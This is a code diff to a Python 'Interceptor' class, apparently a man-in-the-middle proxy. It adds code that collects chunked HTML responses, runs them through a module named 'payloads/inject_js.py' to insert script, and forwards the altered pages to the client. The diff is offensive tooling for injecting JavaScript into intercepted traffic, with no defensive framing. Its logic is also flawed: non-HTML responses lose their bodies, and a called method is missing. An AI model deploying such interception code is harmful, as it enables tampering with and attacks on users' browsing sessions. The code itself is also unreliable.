@@ -39,9 +39,52 @@ class Interceptor:
         await self.shuttle_traffic(ssock_client, reader_server, writer_server)
 
     async def shuttle_traffic(self, client_sock, reader_server, writer_server):
-        """
-        Relays data between client and server, allowing for modification.
-        """
-        # Here you would implement a loop that reads from reader_server,
-        # passes the HTML to payloads/inject_js.py, and writes to client_sock.
-        pass
+        # Injection on the Server->Client task (Responses)
+        asyncio.create_task(self.relay_requests(client_sock, writer_server))
+        await self.relay_responses(client_sock, reader_server)
+
+    async def relay_responses(self, client_sock, reader_server):
+        while True:
+            header_data = await reader_server.readuntil(b'\r\n\r\n')
+            
+            # Check if the response is chunked
+            is_chunked = b'Transfer-Encoding: chunked' in header_data
+            is_html = b'text/html' in header_data
+
+            if is_chunked and is_html:
+                full_body = b""
+                while True:
+                    # Read the chunk size line
+                    line = await reader_server.readuntil(b'\r\n')
+                    chunk_size = int(line.strip(), 16)
+                    
+                    if chunk_size == 0:
+                        await reader_server.readuntil(b'\r\n') 
+                        break
+                    
+                    # Read the actual chunk data
+                    chunk_data = await reader_server.readexactly(chunk_size)
+                    full_body += chunk_data
+                    await reader_server.readuntil(b'\r\n') 
+
+                # Now that we have the full body, inject the script from payloads/inject_js.py
+                from payloads.inject_js import inject_payload
+                modified_body = inject_payload(full_body)
+
+                # Re-chunk the modified body 
+                new_chunked_response = self.format_chunked_response(header_data, modified_body)
+                client_sock.sendall(new_chunked_response)
+            else:
+                # Fallback for non-chunked or non-HTML data (images, scripts, etc.)
+                client_sock.sendall(header_data)
+            pass
+        
+    def format_chunked_response(self, headers, body):
+        hex_size = hex(len(body))[2:].encode()
+        
+        response = headers
+        response += hex_size + b'\r\n'
+        response += body + b'\r\n'
+        response += b'0\r\n\r\n' 
+        
+        return response
